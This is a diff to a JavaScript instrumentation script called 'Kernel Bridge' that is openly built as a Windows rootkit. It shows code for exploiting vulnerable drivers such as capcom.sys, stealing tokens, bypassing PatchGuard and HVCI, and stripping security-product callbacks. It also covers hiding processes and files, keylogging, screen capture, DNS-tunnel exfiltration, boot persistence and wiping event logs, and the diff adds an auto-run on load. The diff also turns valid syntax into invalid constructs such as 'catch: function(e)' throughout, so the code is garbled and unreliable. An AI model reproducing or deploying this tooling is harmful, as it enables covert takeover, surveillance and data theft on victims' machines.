@@ -27,7 +27,7 @@
  * License: GPL v3
  */
 
-{
+const KernelBridge = {
     name: "Kernel Bridge",
     description: "Kernel-level bypass through vulnerable driver exploitation",
     version: "1.0.0",
@@ -204,7 +204,7 @@
             if (isAdmin) {
                 return new NativeFunction(isAdmin, 'bool', [])();
             }
-        } catch(e) {}
+        } catch: function(e) {}
 
         return false;
     },
@@ -299,7 +299,7 @@
             });
 
             // Try to open device again
-            setTimeout(function() {
+            setTimeout: function(function() {
                 self.findVulnerableDriver();
             }, 1000);
         }
@@ -411,7 +411,7 @@
             action: "bypassing_patchguard"
         });
 
-        switch(this.config.patchGuard.method) {
+        switch: function(this.config.patchGuard.method) {
             case "exception_hook":
                 this.bypassPGViaExceptionHook();
                 break;
@@ -859,7 +859,7 @@
         var self = this;
 
         // Different drivers have different input structures
-        switch(this.currentDriver.name) {
+        switch: function(this.currentDriver.name) {
             case "capcom.sys":
                 return this.prepareCapcomPayload(shellcode);
 
@@ -1042,7 +1042,7 @@
                     };
 
                     // Attempt exploitation based on method
-                    switch(driver.method) {
+                    switch: function(driver.method) {
                         case "msi_afterburner":
                             self.exploitMSIAfterburnerVuln(handle, driver.ioctl);
                             break;
@@ -1082,7 +1082,7 @@
                 action: "advanced_kernel_exploitation_initialized"
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -1111,7 +1111,7 @@
             };
 
             // Advanced token manipulation
-            this.setupAdvancedTokenManipulation = function() {
+            this.setupAdvancedTokenManipulation = function: function() {
                 // Find token objects in kernel space
                 var systemToken = self.findSystemProcessToken();
                 if (systemToken) {
@@ -1132,7 +1132,7 @@
             };
 
             // Advanced driver object manipulation
-            this.setupDriverObjectManipulation = function() {
+            this.setupDriverObjectManipulation = function: function() {
                 // Enumerate all driver objects
                 var driverList = self.enumerateDriverObjects();
                 driverList.forEach(function(driver) {
@@ -1151,7 +1151,7 @@
             };
 
             // Advanced device object manipulation
-            this.setupDeviceObjectManipulation = function() {
+            this.setupDeviceObjectManipulation = function: function() {
                 // Find and manipulate critical device objects
                 var criticalDevices = [
                     "\\Device\\PhysicalMemory",
@@ -1176,7 +1176,7 @@
             };
 
             // Advanced section object manipulation
-            this.setupSectionObjectManipulation = function() {
+            this.setupSectionObjectManipulation = function: function() {
                 // Manipulate memory sections for code injection
                 var ntdllSection = self.findModuleSection("ntdll.dll");
                 var kernelSection = self.findModuleSection("ntoskrnl.exe");
@@ -1213,7 +1213,7 @@
                 action: "kernel_object_manipulation_complete"
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -1247,7 +1247,7 @@
             };
 
             // Advanced context modification bypass
-            this.setupContextModificationBypass = function() {
+            this.setupContextModificationBypass = function: function() {
                 // Find PatchGuard contexts
                 var pgContexts = self.findPatchGuardContexts();
                 pgContexts.forEach(function(context) {
@@ -1266,7 +1266,7 @@
             };
 
             // Advanced timer manipulation bypass
-            this.setupTimerManipulationBypass = function() {
+            this.setupTimerManipulationBypass = function: function() {
                 // Hook KeSetTimer functions to intercept PatchGuard timers
                 var timerFunctions = ["KeSetTimer", "KeSetTimerEx", "KeCancelTimer"];
                 timerFunctions.forEach(function(funcName) {
@@ -1285,7 +1285,7 @@
             };
 
             // Advanced interrupt hooking bypass
-            this.setupInterruptHookingBypass = function() {
+            this.setupInterruptHookingBypass = function: function() {
                 // Hook interrupt handlers to prevent PatchGuard checks
                 var interruptVectors = [0x2E, 0x2F, 0xD1, 0xE1]; // Common PatchGuard interrupts
                 interruptVectors.forEach(function(vector) {
@@ -1300,7 +1300,7 @@
             };
 
             // HVCI (Hypervisor-protected Code Integrity) bypass
-            this.setupHVCIBypass = function() {
+            this.setupHVCIBypass = function: function() {
                 // Check if HVCI is enabled
                 if (self.isHVCIEnabled()) {
                     // Bypass HVCI through hypervisor manipulation
@@ -1314,7 +1314,7 @@
             };
 
             // CFI (Control Flow Integrity) bypass
-            this.setupCFIBypass = function() {
+            this.setupCFIBypass = function: function() {
                 // Check if CFI is enabled
                 if (self.isCFIEnabled()) {
                     // Bypass CFI through ROP chain manipulation
@@ -1327,7 +1327,7 @@
             };
 
             // Advanced PatchGuard notification hook
-            this.setupPGNotificationBypass = function() {
+            this.setupPGNotificationBypass = function: function() {
                 // Hook KeBugCheckEx to intercept PatchGuard bug checks
                 var keBugCheckEx = self.getKernelExport("KeBugCheckEx");
                 if (keBugCheckEx) {
@@ -1364,7 +1364,7 @@
                 }).length
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -1399,7 +1399,7 @@
             };
 
             // Advanced hypervisor detection
-            this.detectAdvancedHypervisors = function() {
+            this.detectAdvancedHypervisors = function: function() {
                 var hypervisors = [];
 
                 // CPUID-based detection
@@ -1413,7 +1413,7 @@
                             detection_method: "cpuid"
                         });
                     }
-                } catch(e) {}
+                } catch: function(e) {}
 
                 // MSR-based detection
                 try {
@@ -1429,7 +1429,7 @@
                             });
                         }
                     });
-                } catch(e) {}
+                } catch: function(e) {}
 
                 // Timing-based detection
                 var timingResults = self.performTimingDetection();
@@ -1445,7 +1445,7 @@
             };
 
             // CPUID spoofing for hypervisor evasion
-            this.setupCPUIDSpoofing = function() {
+            this.setupCPUIDSpoofing = function: function() {
                 // Hook CPUID instruction execution
                 var cpuidHandler = self.createCPUIDHandler();
                 if (self.hookCPUIDInstruction(cpuidHandler)) {
@@ -1460,7 +1460,7 @@
             };
 
             // Timing attack evasion
-            this.setupTimingAttackEvasion = function() {
+            this.setupTimingAttackEvasion = function: function() {
                 // Hook timing-related functions
                 var timingFunctions = ["KeQueryPerformanceCounter", "KeQuerySystemTime", "RtlGetSystemTimePrecise"];
                 var hookedCount = 0;
@@ -1478,7 +1478,7 @@
             };
 
             // VMEXIT hooking for advanced hypervisor evasion
-            this.setupVMExitHooking = function() {
+            this.setupVMExitHooking = function: function() {
                 // Hook common VMEXIT triggers
                 var vmexitTriggers = [
                     { instruction: "VMCALL", handler: self.createVMCallHook },
@@ -1498,14 +1498,14 @@
                                 instruction: trigger.instruction
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 self.hypervisorEvasion.evasionMethods.vmexitHooking = true;
             };
 
             // MSR manipulation for hypervisor evasion
-            this.setupMSRManipulation = function() {
+            this.setupMSRManipulation = function: function() {
                 // Manipulate hypervisor-specific MSRs
                 var hypervisorMSRs = [
                     { msr: 0x174, name: "SYSENTER_CS" },
@@ -1531,14 +1531,14 @@
                                 spoofed: spoofedValue
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 self.hypervisorEvasion.evasionMethods.msrManipulation = true;
             };
 
             // Hypercall interception
-            this.setupHypercallInterception = function() {
+            this.setupHypercallInterception = function: function() {
                 // Intercept common hypercalls
                 var commonHypercalls = [0x0001, 0x0002, 0x0008, 0x000C, 0x0012]; // VMware hypercalls
                 
@@ -1577,7 +1577,7 @@
                 }).length
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -1611,7 +1611,7 @@
             };
 
             // Atomic code injection for stealth
-            this.setupAtomicCodeInjection = function() {
+            this.setupAtomicCodeInjection = function: function() {
                 // Find suitable injection points in kernel space
                 var injectionPoints = self.findKernelInjectionPoints();
                 injectionPoints.forEach(function(point) {
@@ -1634,7 +1634,7 @@
             };
 
             // Driver entry point hooking
-            this.setupDriverEntryPointHook = function() {
+            this.setupDriverEntryPointHook = function: function() {
                 // Find loaded drivers
                 var loadedDrivers = self.enumerateLoadedDrivers();
                 var targetDrivers = loadedDrivers.filter(function(driver) {
@@ -1664,7 +1664,7 @@
             };
 
             // System call injection
-            this.setupSystemCallInjection = function() {
+            this.setupSystemCallInjection = function: function() {
                 // Create custom system call
                 var customSyscallCode = self.createCustomSystemCall();
                 var syscallAddress = self.allocateKernelMemory(customSyscallCode.length);
@@ -1687,7 +1687,7 @@
             };
 
             // APC (Asynchronous Procedure Call) injection
-            this.setupAPCInjection = function() {
+            this.setupAPCInjection = function: function() {
                 // Find target processes for APC injection
                 var targetProcesses = self.findTargetProcesses();
                 var injectedCount = 0;
@@ -1713,7 +1713,7 @@
             };
 
             // DPC (Deferred Procedure Call) injection
-            this.setupDPCInjection = function() {
+            this.setupDPCInjection = function: function() {
                 // Create DPC routine
                 var dpcRoutine = self.createDPCRoutine();
                 var dpcAddress = self.allocateKernelMemory(dpcRoutine.length);
@@ -1732,7 +1732,7 @@
             };
 
             // Advanced shellcode creation
-            this.createAdvancedShellcodes = function() {
+            this.createAdvancedShellcodes = function: function() {
                 // Token stealing shellcode
                 self.kernelCodeInjection.shellcodes["token_steal"] = self.createTokenStealShellcode();
                 
@@ -1766,7 +1766,7 @@
                 shellcodes_created: Object.keys(this.kernelCodeInjection.shellcodes).length
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -1802,7 +1802,7 @@
             };
 
             // Advanced process callback evasion
-            this.setupProcessCallbackEvasion = function() {
+            this.setupProcessCallbackEvasion = function: function() {
                 // Find all process creation callbacks
                 var pspCallbacks = self.findPspCreateProcessNotifyRoutine();
                 if (pspCallbacks) {
@@ -1838,7 +1838,7 @@
             };
 
             // Advanced thread callback evasion
-            this.setupThreadCallbackEvasion = function() {
+            this.setupThreadCallbackEvasion = function: function() {
                 // Find thread creation callbacks
                 var threadCallbacks = self.findPspCreateThreadNotifyRoutine();
                 if (threadCallbacks) {
@@ -1861,7 +1861,7 @@
             };
 
             // Advanced image load callback evasion
-            this.setupImageLoadCallbackEvasion = function() {
+            this.setupImageLoadCallbackEvasion = function: function() {
                 // Find image load callbacks
                 var imageCallbacks = self.findPspLoadImageNotifyRoutine();
                 if (imageCallbacks) {
@@ -1884,7 +1884,7 @@
             };
 
             // Advanced registry callback evasion
-            this.setupRegistryCallbackEvasion = function() {
+            this.setupRegistryCallbackEvasion = function: function() {
                 // Find registry callbacks
                 var registryCallbacks = self.findCmCallbackListHead();
                 if (registryCallbacks) {
@@ -1913,7 +1913,7 @@
             };
 
             // Advanced object callback evasion
-            this.setupObjectCallbackEvasion = function() {
+            this.setupObjectCallbackEvasion = function: function() {
                 // Find object manager callbacks
                 var objectCallbacks = self.findObCallbackListHead();
                 if (objectCallbacks) {
@@ -1936,7 +1936,7 @@
             };
 
             // Advanced bug check callback evasion
-            this.setupBugCheckCallbackEvasion = function() {
+            this.setupBugCheckCallbackEvasion = function: function() {
                 // Find bug check callbacks (used by security products)
                 var bugCheckCallbacks = self.findBugCheckCallbackList();
                 bugCheckCallbacks.forEach(function(callback) {
@@ -1952,7 +1952,7 @@
             };
 
             // Callback spoofing for advanced evasion
-            this.setupCallbackSpoofing = function() {
+            this.setupCallbackSpoofing = function: function() {
                 // Create fake callbacks to confuse analysis
                 var fakeCallbacks = self.createFakeCallbacks();
                 fakeCallbacks.forEach(function(fake) {
@@ -1996,7 +1996,7 @@
                 object_callbacks: this.callbackEvasion.objectCallbacks.length
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -2036,7 +2036,7 @@
             };
 
             // Advanced physical memory access
-            this.setupPhysicalMemoryAccess = function() {
+            this.setupPhysicalMemoryAccess = function: function() {
                 // Find physical memory device
                 var physMemDevice = self.findPhysicalMemoryDevice();
                 if (physMemDevice) {
@@ -2057,7 +2057,7 @@
             };
 
             // Advanced PTE (Page Table Entry) manipulation
-            this.setupPTEManipulation = function() {
+            this.setupPTEManipulation = function: function() {
                 // Find important pages to manipulate
                 var targetPages = [
                     { name: "SSDT", address: self.ssdtAddress },
@@ -2090,14 +2090,14 @@
             };
 
             // Advanced VAD (Virtual Address Descriptor) tree modification
-            this.setupVADTreeModification = function() {
+            this.setupVADTreeModification = function: function() {
                 // Find current process VAD tree
                 var currentProcess = self.getCurrentProcessEPROCESS();
                 if (currentProcess) {
                     var vadRoot = self.readKernelMemory(currentProcess.add(0x658), 8); // VadRoot offset
                     if (vadRoot.toInt32() !== 0) {
                         // Traverse and modify VAD tree
-                        self.traverseVADTree(vadRoot, function(vadNode) {
+                        self.traverseVADTree(vadRoot, function: function(vadNode) {
                             // Hide specific memory regions
                             var startAddress = self.readKernelMemory(vadNode.add(0x18), 8);
                             var endAddress = self.readKernelMemory(vadNode.add(0x20), 8);
@@ -2128,7 +2128,7 @@
             };
 
             // Advanced pool tag spoofing
-            this.setupPoolTagSpoofing = function() {
+            this.setupPoolTagSpoofing = function: function() {
                 // Find pool allocations with our tags
                 var poolRegions = self.scanPoolAllocations();
                 var spoofedCount = 0;
@@ -2155,7 +2155,7 @@
             };
 
             // Advanced memory compression bypass
-            this.setupMemoryCompression = function() {
+            this.setupMemoryCompression = function: function() {
                 // Check if memory compression is enabled
                 if (self.isMemoryCompressionEnabled()) {
                     // Find memory manager compression structures
@@ -2176,7 +2176,7 @@
             };
 
             // Advanced kernel stack manipulation
-            this.setupKernelStackManipulation = function() {
+            this.setupKernelStackManipulation = function: function() {
                 // Find kernel stacks of critical processes
                 var criticalProcesses = self.findCriticalProcesses();
                 criticalProcesses.forEach(function(process) {
@@ -2196,7 +2196,7 @@
             };
 
             // Advanced memory pattern obfuscation
-            this.setupMemoryPatternObfuscation = function() {
+            this.setupMemoryPatternObfuscation = function: function() {
                 // Obfuscate memory patterns that could be detected
                 self.kernelMemoryManipulation.allocatedMemory.forEach(function(allocation) {
                     if (allocation.address) {
@@ -2231,7 +2231,7 @@
                 }).length
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -2277,7 +2277,7 @@
             };
 
             // Advanced boot persistence
-            this.setupBootPersistence = function() {
+            this.setupBootPersistence = function: function() {
                 // Multiple boot persistence methods
                 var persistenceMethods = [
                     { name: "bootkit", setup: self.setupBootkit },
@@ -2298,14 +2298,14 @@
                                 method: method.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 self.advancedRootkit.persistence.bootPersistence = successCount > 0;
             };
 
             // Advanced process hiding
-            this.setupProcessHiding = function() {
+            this.setupProcessHiding = function: function() {
                 // Multiple process hiding techniques
                 var hidingTechniques = [
                     { name: "eprocess_unlink", method: self.unlinkEPROCESS },
@@ -2327,7 +2327,7 @@
                                     hidden: true
                                 });
                             }
-                        } catch(e) {}
+                        } catch: function(e) {}
                     });
                     
                     self.advancedRootkit.stealth.processHiding = self.advancedRootkit.hiddenProcesses.length > 0;
@@ -2335,7 +2335,7 @@
             };
 
             // Advanced file system hiding
-            this.setupFileSystemHiding = function() {
+            this.setupFileSystemHiding = function: function() {
                 // Hook file system drivers
                 var fsDrivers = ["ntfs.sys", "fastfat.sys", "refs.sys"];
                 fsDrivers.forEach(function(driverName) {
@@ -2360,7 +2360,7 @@
             };
 
             // Advanced registry hiding
-            this.setupRegistryHiding = function() {
+            this.setupRegistryHiding = function: function() {
                 // Hook registry operations
                 var registryRoutines = [
                     { name: "NtEnumerateKey", syscall: 0x0F },
@@ -2383,7 +2383,7 @@
             };
 
             // Advanced network hiding
-            this.setupNetworkHiding = function() {
+            this.setupNetworkHiding = function: function() {
                 // Hook network-related APIs
                 var networkDrivers = ["tcpip.sys", "afd.sys", "netio.sys"];
                 networkDrivers.forEach(function(driverName) {
@@ -2413,7 +2413,7 @@
             };
 
             // Advanced keylogging capability
-            this.setupKeylogging = function() {
+            this.setupKeylogging = function: function() {
                 // Hook keyboard input
                 var keyboardHook = self.createKeyboardHook();
                 
@@ -2431,14 +2431,14 @@
                             var hook = target.hook();
                             self.installInlineHook(targetAddr, target.name + "_Keylog");
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 self.advancedRootkit.capabilities.keylogging = true;
             };
 
             // Advanced screenshot capture
-            this.setupScreenshotCapture = function() {
+            this.setupScreenshotCapture = function: function() {
                 // Hook graphics subsystem
                 var graphicsTargets = [
                     { name: "win32k!NtGdiStretchBlt", hook: self.createGDIHook },
@@ -2453,14 +2453,14 @@
                             var hook = target.hook();
                             self.installInlineHook(targetAddr, target.name + "_Screenshot");
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 self.advancedRootkit.capabilities.screenshotCapture = true;
             };
 
             // Advanced data exfiltration
-            this.setupDataExfiltration = function() {
+            this.setupDataExfiltration = function: function() {
                 // Create covert communication channels
                 var exfiltrationChannels = [
                     { name: "dns_tunnel", setup: self.setupDNSTunnel },
@@ -2481,7 +2481,7 @@
                                 channel: channel.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 self.advancedRootkit.capabilities.dataExfiltration = activeChannels > 0;
@@ -2520,7 +2520,7 @@
                 hidden_files: this.advancedRootkit.hiddenFiles.length
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -2560,7 +2560,7 @@
             };
 
             // Advanced debugger detection
-            this.detectAdvancedDebuggers = function() {
+            this.detectAdvancedDebuggers = function: function() {
                 // Check for kernel debugger
                 var kdDebuggerEnabled = self.checkKdDebuggerEnabled();
                 if (kdDebuggerEnabled) {
@@ -2610,7 +2610,7 @@
             };
 
             // Advanced debugger disruption
-            this.setupDebuggerDisruption = function() {
+            this.setupDebuggerDisruption = function: function() {
                 // Disrupt kernel debugger
                 if (self.debuggingEvasion.debuggerDetection.kernelDebugger) {
                     // Overwrite debug interrupt handlers
@@ -2647,14 +2647,14 @@
                                 method: method.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 self.debuggingEvasion.evasionTechniques.debuggerDisruption = true;
             };
 
             // Advanced breakpoint evasion
-            this.setupBreakpointEvasion = function() {
+            this.setupBreakpointEvasion = function: function() {
                 // Scan for and remove software breakpoints
                 var codeRegions = self.getExecutableCodeRegions();
                 var breakpointsFound = 0;
@@ -2701,7 +2701,7 @@
             };
 
             // Advanced timing manipulation
-            this.setupTimingManipulation = function() {
+            this.setupTimingManipulation = function: function() {
                 // Hook timing functions to prevent timing-based analysis
                 var timingFunctions = [
                     "KeQueryPerformanceCounter",
@@ -2730,7 +2730,7 @@
             };
 
             // Advanced memory protection against analysis
-            this.setupMemoryProtection = function() {
+            this.setupMemoryProtection = function: function() {
                 // Protect critical code regions
                 var criticalRegions = [
                     { name: "kernel_bridge_code", start: ptr(self), size: 0x10000 },
@@ -2753,7 +2753,7 @@
             };
 
             // Advanced anti-analysis techniques
-            this.setupAdvancedAntiAnalysis = function() {
+            this.setupAdvancedAntiAnalysis = function: function() {
                 // Anti-disassembly techniques
                 var antiDisassembly = [
                     { name: "JunkCode", method: self.insertJunkCode },
@@ -2772,7 +2772,7 @@
                                 technique: technique.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 // Anti-emulation techniques
@@ -2793,7 +2793,7 @@
                                 technique: technique.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 self.debuggingEvasion.evasionTechniques.antiAnalysis = true;
@@ -2824,7 +2824,7 @@
                 protected_memory_regions: this.debuggingEvasion.protectedRegions.length
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -2859,7 +2859,7 @@
             };
 
             // Advanced driver stealth
-            this.setupDriverStealth = function() {
+            this.setupDriverStealth = function: function() {
                 // Multiple driver hiding techniques
                 var driverStealthMethods = [
                     { name: "UnlinkDriverObject", method: self.unlinkDriverFromList },
@@ -2887,7 +2887,7 @@
                                     method: method.name
                                 });
                             }
-                        } catch(e) {}
+                        } catch: function(e) {}
                     });
                 }
 
@@ -2898,7 +2898,7 @@
             };
 
             // Advanced memory stealth
-            this.setupMemoryStealth = function() {
+            this.setupMemoryStealth = function: function() {
                 // Encrypt sensitive memory regions
                 var sensitiveRegions = self.getSensitiveMemoryRegions();
                 sensitiveRegions.forEach(function(region) {
@@ -2933,7 +2933,7 @@
             };
 
             // Advanced execution stealth
-            this.setupExecutionStealth = function() {
+            this.setupExecutionStealth = function: function() {
                 // Hide execution traces
                 var executionStealthMethods = [
                     { name: "DisableETW", method: self.disableETWTracing },
@@ -2958,7 +2958,7 @@
                                 method: method.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 // Advanced code obfuscation during runtime
@@ -2971,7 +2971,7 @@
             };
 
             // Advanced communication stealth
-            this.setupCommunicationStealth = function() {
+            this.setupCommunicationStealth = function: function() {
                 // Setup covert communication channels
                 var stealthChannels = [
                     { name: "SystemCallChannel", setup: self.setupSystemCallChannel },
@@ -2998,7 +2998,7 @@
                                 channel: channel.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 // Implement encrypted communication protocols
@@ -3011,7 +3011,7 @@
             };
 
             // Advanced forensic stealth
-            this.setupForensicStealth = function() {
+            this.setupForensicStealth = function: function() {
                 // Anti-forensic techniques
                 var antiForensicMethods = [
                     { name: "ClearEventLogs", method: self.clearSystemEventLogs },
@@ -3031,7 +3031,7 @@
                                 method: method.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 // Setup continuous artifact cleanup
@@ -3047,7 +3047,7 @@
             };
 
             // Advanced stealth monitoring
-            this.setupStealthMonitoring = function() {
+            this.setupStealthMonitoring = function: function() {
                 // Monitor for detection attempts
                 var detectionMonitors = [
                     { name: "ScannerDetection", monitor: self.monitorForScanners },
@@ -3067,7 +3067,7 @@
                                 monitor: monitor.name
                             });
                         }
-                    } catch(e) {}
+                    } catch: function(e) {}
                 });
 
                 // Setup automatic stealth adaptation
@@ -3097,7 +3097,7 @@
                 stealth_channels: this.advancedStealth.stealthChannels.length
             });
 
-        } catch(e) {
+        } catch: function(e) {
             send({
                 type: "error",
                 target: "kernel_bridge",
@@ -3117,4 +3117,20 @@ if (Process.platform === 'windows') {
     target: "kernel_bridge",
     action: "platform_not_supported"
 });
+
+};
+
+// Auto-initialize on load
+setTimeout(function() {
+    KernelBridge.run();
+    send({
+        type: "status",
+        target: "kernel_bridge",
+        action: "system_now_active"
+    });
+}, 100);
+
+// Export for use in other modules or direct execution
+if (typeof module !== 'undefined' && module.exports) {
+    module.exports = KernelBridge;
 }
